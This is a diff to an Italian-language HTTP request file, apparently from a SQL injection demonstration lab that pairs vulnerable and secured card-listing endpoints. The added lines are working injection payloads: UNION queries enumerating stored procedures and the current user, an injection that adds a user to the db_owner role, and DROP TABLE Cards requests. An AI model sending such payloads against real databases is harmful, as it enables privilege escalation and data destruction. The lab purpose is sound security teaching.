@@ -193,3 +193,24 @@ GET {{baseurldb2}}/cards/list?text=';DELETE%20FROM%20Cards%20WHERE%20number='123
 ### [DIFESA - DB2] Eliminazione respinta in sicurezza su PostgreSQL
 GET {{baseurldb2}}/cards/list-secure?text=';DELETE%20Cards%20WHERE%20number='1234567890123456'--
 ###
+
+
+###########################################################################
+########## 5. Ottenimento di privilegi superiori ##########################
+###########################################################################
+
+### Cerca stored procedure con aumento dei privilegi
+GET {{baseurldb1}}/cards/list?text='%20union%20all%20SELECT%20SCHEMA_NAME(p.schema_id)%2B'-'%2Bp.name,null,'2001-01-01',1,ISNULL(par.name,'--nessun%20parametro%20--')%2B'-'%2BISNULL(TYPE_NAME(par.user_type_id),'')%2B'-'%2Bconvert(varchar,ISNULL(par.max_length,0))%20FROM%20sys.procedures%20p%20JOIN%20sys.schemas%20s%20ON%20s.schema_id=p.schema_id%20AND%20s.name='dbo'%20LEFT%20JOIN%20sys.parameters%20par%20ON%20par.object_id=p.object_id%20AND%20par.parameter_id%20>0%20JOIN%20sys.sql_modules%20m%20ON%20p.object_id=m.object_id%20WHERE%20m.execute_as_principal_id=-2--
+
+### Recupero dell'utente corrente
+GET {{baseurldb1}}/cards/list?text=aaa'UNION%20ALL%20SELECT%20USER_NAME(),null,'2001-01-01',1,''--
+
+### Elevazione di privilegi
+GET {{baseurldb1}}/cards/list?text=aaa';exec%20dbo.getdata%20'cards;ALTER%20ROLE%20db_owner%20ADD%20MEMBER%20nonauth'--
+
+### Drop di una tabella tramite injection nella stored procedure
+GET {{baseurldb1}}/cards/list?text=cards';drop%20table%20Cards--
+
+### Drop di una tabella tramite injection classica avendo privilegi innalzati
+GET {{baseurldb1}}/cards/list?text=cards';drop%20table%20Cards--
+
